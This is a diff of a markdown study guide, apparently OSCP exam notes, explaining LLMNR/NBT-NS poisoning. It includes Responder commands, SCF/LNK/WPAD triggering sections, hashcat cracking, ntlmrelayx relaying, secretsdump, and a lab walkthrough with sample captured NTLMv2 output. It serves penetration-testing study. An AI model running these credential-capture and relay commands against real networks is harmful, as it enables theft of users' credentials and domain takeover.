@@ -6,9 +6,9 @@
 
 ## 1.1 What is DNS?
 
-DNS (Domain Name System) is like a **phonebook of the network**.
+Think of DNS (Domain Name System) as a phone book for the internet and your local network.
+When you type \\fileserver or \\CORP-DC01 in Windows Explorer, your computer needs to find the IP address of that machine. It asks DNS first.
 
-When you type:
 
 ```bash
 \\fileserver
@@ -24,30 +24,38 @@ PC → DNS Server → IP Address → Connection
 
 ## 1.2 What is LLMNR?
 
-LLMNR = **Link-Local Multicast Name Resolution**
+LLMNR = Link-Local Multicast Name Resolution
+LLMNR is a fallback protocol. When DNS fails to resolve a name, Windows doesn't give up — it broadcasts a question to the entire local network:
 
-Fallback protocol when DNS fails.
+"Hey, does anyone know the IP address of 'FILESERVER01'?"
 
-### Flow:
-
+Any machine on the network can respond.
 ```bash
-PC → DNS (fails)
-PC → Broadcast (LLMNR) → "Who is FILESERVER01?"
-Any system → replies
+LLMNR Resolution Flow:
+Your PC → asks DNS → DNS says "I don't know"
+Your PC → broadcasts via LLMNR to entire subnet → "Does anyone know FILESERVER01?"
+Any machine can reply → "Yes! I am FILESERVER01, my IP is X.X.X.X"
 ```
 
-### Key Facts:
-
-* UDP Port: **5355**
-* Works on **local subnet only**
-* Enabled by default (Windows)
-* ❌ No authentication
+Key Facts about LLMNR:
+Uses UDP port 5355
+Works only on the local subnet (link-local = same network segment)
+Enabled by default on Windows Vista and later
+No authentication — anyone can answer
 
 ---
 
 ## 1.3 What is NBT-NS?
 
-NBT-NS = **NetBIOS Name Service**
+NBT-NS = NetBIOS Name Service — an older, similar protocol.
+
+Uses UDP port 137
+Even older than LLMNR
+Also enabled by default
+Also broadcasts on local network
+Also has zero verification
+
+Both LLMNR and NBT-NS are fallback mechanisms. Both are exploitable the same way.
 
 ### Key Facts:
 
@@ -60,18 +68,18 @@ NBT-NS = **NetBIOS Name Service**
 
 ## 1.4 Why LLMNR Exists?
 
-* Small networks without DNS
-* Auto device discovery
+LLMNR was designed for small networks or home environments where setting up a full DNS server is impractical. It lets machines discover each other automatically on a local network without administrator setup.
+In enterprise environments, it is largely unnecessary because proper DNS is configured — but it remains enabled by default, making it a persistent security risk.
 
-⚠️ In enterprise → **Unnecessary but still enabled**
 
 ---
 
 ## 1.5 Why LLMNR is Vulnerable?
 
-* No authentication
-* No trust validation
-* Anyone can spoof response
+The fundamental problem: No verification.
+When your PC broadcasts "Who is FILESERVER01?", it will trust any response it gets back. There is no cryptographic proof, no authentication, no way to verify the responder is legitimate.
+This is the vulnerability that makes the entire attack possible.
+
 
 ---
 
@@ -88,6 +96,20 @@ Hash:     a87f3b2c9d...
 ✔ Can brute-force
 
 ---
+## What is NTLM?
+
+NTLM = NT LAN Manager — Windows' legacy authentication protocol.
+
+When you connect to a Windows share or service, Windows doesn't send your password directly. It uses a challenge-response system:
+Step 1: Client says "I want to authenticate as USER"
+Step 2: Server sends a random "challenge" number
+Step 3: Client computes: NTLM_Hash(password) + Challenge = Response
+Step 4: Client sends Response to server
+Step 5: Server verifies the Response
+
+NTLMv2 is the newer version — it adds a client-side challenge too, making it harder to crack, but the fundamental mechanism is the same.
+Why this matters for our attack: If an attacker can position themselves as the "server" in step 2, they receive the NTLMv2 hash in step 4. That hash can be cracked offline or relayed.
+
 
 ## 2.2 NTLM Authentication Flow
 
@@ -103,29 +125,59 @@ Hash:     a87f3b2c9d...
 
 ## 2.3 What Attacker Captures
 
-* Username
-* Domain
-* Challenge
-* NTLMv2 Response
+The attacker captures the NTLMv2 Net-Hash — specifically:
 
-✔ Crackable
-✔ Relayable
+The username
+The domain name
+The challenge (which the attacker sent)
+The response (which contains the hash of the password)
+
+This is NOT the actual password. But it can be:
+
+Cracked offline using hashcat
+Relayed to other machines for authentication (without cracking)
+
 
 ---
 
 # SECTION 3: LLMNR POISONING
 
+## 3.1 Simple Real-Life Analogy
+Imagine you're in an office and you shout out loud:
+
+"Hey, does anyone know where John's desk is?"
+
+A malicious person in the office (who heard your question) runs up to you first and says:
+
+"Yes! I'm John, follow me!"
+
+You follow them. They are NOT John. But you believed them because no one verified it.
+Now they ask you:
+
+"Before I show you John's desk, please prove who you are — tell me your name and credentials."
+
+You hand over your credentials. Attack successful.
+This is exactly LLMNR Poisoning.
+
+
 ## Attack Flow
 
 ```bash
-1. Victim → \\FILESERVER01 (wrong name)
-2. DNS fails
-3. LLMNR broadcast
-4. Attacker replies (spoof)
-5. Victim connects to attacker
-6. NTLM authentication happens
-7. Hash captured
+1. Victim PC tries to access \\FILESERVER01 (a typo or non-existent share)
+2. DNS doesn't know FILESERVER01 → fails
+3. Victim broadcasts LLMNR: "Who is FILESERVER01?"
+4. Attacker (Responder) hears broadcast, replies: "I am FILESERVER01! IP: [Attacker IP]"
+5. Victim trusts the response, tries to authenticate to Attacker
+6. Windows automatically sends NTLMv2 credentials to Attacker
+7. Attacker captures the hash
+
 ```
+## 3.3 What Vulnerability Does It Abuse?
+
+No authentication on LLMNR responses — anyone can claim to be any host
+Windows automatic credential forwarding — Windows automatically sends credentials when connecting to network resources
+LLMNR enabled by default — no admin action needed to be vulnerable
+
 
 ---
 
@@ -147,44 +199,72 @@ Hash:     a87f3b2c9d...
 
 ---
 
-# SECTION 5: ATTACK CHAIN
+# SECTION 5: FULL ATTACK FLOW
 
-```bash
-Outside → Initial Access → Internal Network → LLMNR Poisoning
-→ Hash Capture → Crack / Relay → Lateral Movement → Domain Admin
-```
+Phase 1: Reconnaissance
+├── nmap -sC -sV -p- [target range]
+├── Identify Windows machines
+├── Identify domain name
+└── Identify services (SMB, LDAP, Kerberos → AD confirmed)
+
+Phase 2: Initial Access
+├── Find exploitable service (web app, SMB vuln, etc.)
+├── Exploit → get shell on foothold machine
+└── Establish persistent access (optional in exam)
+
+Phase 3: Internal Enumeration
+├── Run: ipconfig /all  (find subnet, domain)
+├── Run: net user /domain
+├── Run: net group "Domain Admins" /domain
+└── Identify other machines on network
+
+Phase 4: LLMNR Poisoning (Credential Capture)
+├── Start Responder on attacker machine
+├── Wait for or trigger LLMNR broadcast
+├── Capture NTLMv2 hash
+└── Save hash to file
+
+Phase 5: Hash Exploitation
+├── Option A: Crack hash with hashcat → use plaintext password
+└── Option B: Relay hash with ntlmrelayx → direct shell
+
+Phase 6: Lateral Movement
+├── Use cracked credentials for SMB, RDP, WinRM
+├── Access more machines
+└── Eventually reach Domain Controller → Domain Admin
+
 
 ---
 
-# SECTION 6: FULL ATTACK FLOW
+# SECTION 6: RESPONDER
 
-## Recon
+Responder is a tool written in Python that poisons LLMNR, NBT-NS, and MDNS responses and sets up rogue servers (SMB, HTTP, FTP, LDAP, etc.) to capture authentication hashes.
+Think of it as: a fake server that pretends to be every service on the network simultaneously.
 
-```bash
-nmap -sC -sV -p- <target>
-```
-
-## Enumeration
-
-```bash
-ipconfig /all
-net user /domain
-net group "Domain Admins" /domain
-```
-
----
-
-# SECTION 7: RESPONDER
 
 ## Installation
 
 ```bash
+# Check if installed
 which responder
+
+# Update/install
 sudo apt update
 sudo apt install responder -y
+
+# Or clone from GitHub
 git clone https://github.com/lgandx/Responder
 cd Responder
 ```
+## 6.1 How Responder Works Internally
+When you run Responder, it:
+
+Listens on the network interface for LLMNR/NBT-NS broadcast queries
+Replies to every query saying "I am that host, my IP is [attacker IP]"
+Starts fake servers: SMB server, HTTP server, FTP server, LDAP server, etc.
+When victims connect to these fake servers (thinking they're real), Responder captures the NTLMv2 authentication attempt
+Saves all captured hashes to /usr/share/responder/logs/
+
 
 ---
 
@@ -198,11 +278,13 @@ sudo responder -I tun0 -rdwv
 
 ## Flags
 
-* `-I` → Interface
-* `-r` → NetBIOS responses
-* `-d` → Domain queries
-* `-w` → WPAD
-* `-v` → Verbose
+| Flag | Meaning | Why Used |
+|------|--------|----------|
+| -I tun0 | Interface to listen on | Specifies which network card to use |
+| -r | Enable answers for netbios wredir requests | Catches additional NetBIOS queries |
+| -d | Enable answers for domain-level NetBIOS queries | Catches domain queries too |
+| -w | Start WPAD (Web Proxy Auto-Discovery) rogue server | Catches browsers looking for proxy settings |
+| -v | Verbose output | Shows all captured requests in real time |
 
 ---
 
@@ -217,21 +299,41 @@ ip a
 
 ---
 
-# SECTION 8: HASH CAPTURE FLOW
+
+# SECTION 7: HASH CAPTURE FLOW
 
 ```bash
-1. Victim typo
-2. DNS fail
-3. LLMNR broadcast
-4. Attacker replies
-5. Victim connects
-6. SMB authentication
-7. NTLMv2 hash captured
+Step 1: User on victim PC types \\FILESERVERR (typo - doesn't exist)
+
+Step 2: Victim PC asks DNS: "What is the IP of FILESERVERR?"
+        DNS Server: "I have no record of FILESERVERR" → FAIL
+
+Step 3: Victim PC sends LLMNR broadcast (UDP 5355) to 224.0.0.252:
+        "Anyone on this network know the IP of FILESERVERR?"
+
+Step 4: Responder (on attacker machine) hears this broadcast
+        Responder replies: "Yes! I am FILESERVERR. My IP is 10.10.14.5 (attacker IP)"
+
+Step 5: Victim PC trusts this response (no verification exists)
+        Victim PC tries to connect to attacker's IP on SMB port 445
+
+Step 6: Responder's fake SMB server receives the connection
+        SMB server sends a challenge to victim
+
+Step 7: Victim's Windows automatically responds with NTLMv2 authentication:
+        - Username
+        - Domain
+        - Challenge (from attacker)
+        - NTLMv2 Response (derived from user's password hash)
+
+Step 8: Responder captures and logs this entire exchange
+        Hash saved to: /usr/share/responder/logs/
 ```
 
 ---
 
-# SECTION 9: PAYLOADS (VERY IMPORTANT)
+# SECTION 8: PAYLOADS (VERY IMPORTANT)  TRIGGERING THE ATTACK — What If No Traffic?
+
 
 ## 9.1 SCF FILE PAYLOAD (AUTO TRIGGER)
 
@@ -261,7 +363,7 @@ put @malicious.scf
 
 ---
 
-## 9.2 LNK FILE PAYLOAD
+## 8.2 LNK FILE PAYLOAD
 
 ### Using Tool:
 
@@ -280,7 +382,7 @@ $link.save()
 
 ---
 
-## 9.3 WPAD ATTACK
+## 8.3 WPAD ATTACK
 
 Run Responder with:
 
@@ -296,7 +398,7 @@ sudo responder -I tun0 -rdwv
 
 ---
 
-## 9.4 FORCED AUTH VIA SMB PATH
+## 8.4 FORCED AUTH VIA SMB PATH
 
 Example:
 
@@ -312,7 +414,7 @@ Used in:
 
 ---
 
-# SECTION 10: SCENARIOS
+# SECTION 9: SCENARIOS
 
 ## Scenario 1: Normal
 
@@ -345,9 +447,9 @@ Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y
 
 ---
 
-# SECTION 11: HASH EXPLOITATION
+# SECTION 10: HASH EXPLOITATION
 
-## Crack Hash
+## Crack Has0
 
 ```bash
 hashcat -m 5600 hash.txt rockyou.txt --force
@@ -379,19 +481,28 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ---
 
-# SECTION 12: OSCP WALKTHROUGH
+## SECTION 11: OSCP REAL EXAM WALKTHROUGH
+Target: 10.10.10.0/24 — AD Environment
 
 ## Step 1: Scan
 
 ```bash
-nmap -sC -sV -p 53,88,135,139,389,445 10.10.10.0/24
-```
+nmap -sC -sV -p 53,88,135,139,389,445,636,3268 10.10.10.0/24
 
+# Result: 10.10.10.1 (DC), 10.10.10.50 (workstation), 10.10.10.75 (file server)
+# Port 88 (Kerberos) and 389 (LDAP) on .1 confirms Active Directory
+```
+ Found web app on 10.10.10.75 port 80
+ Exploited file upload → web shell → reverse shell
+ Now have shell as: CORP\webservice (low privilege)
+ Note: I'm "inside" the network now
+ 
 ---
 
 ## Step 2: Start Responder
 
 ```bash
+# Open second terminal, start Responder right away
 sudo responder -I tun0 -rdwv
 ```
 
@@ -400,8 +511,11 @@ sudo responder -I tun0 -rdwv
 ## Step 3: Capture Hash
 
 ```bash
-Username: CORP\jsmith
-Hash: NTLMv2
+# After 10 minutes, Responder shows:
+[SMB] NTLMv2-SSP Client   : 10.10.10.50
+[SMB] NTLMv2-SSP Username : CORP\jsmith
+[SMB] NTLMv2-SSP Hash     : jsmith::CORP:4B3A2D1E0F9A8B7C:C1D2E3F4...
+
 ```
 
 ---
@@ -438,7 +552,7 @@ python3 secretsdump.py CORP/jsmith:'Password123!'@DC_IP
 
 ---
 
-# SECTION 13: TROUBLESHOOTING
+# SECTION 12: TROUBLESHOOTING
 
 ## No Hash?
 
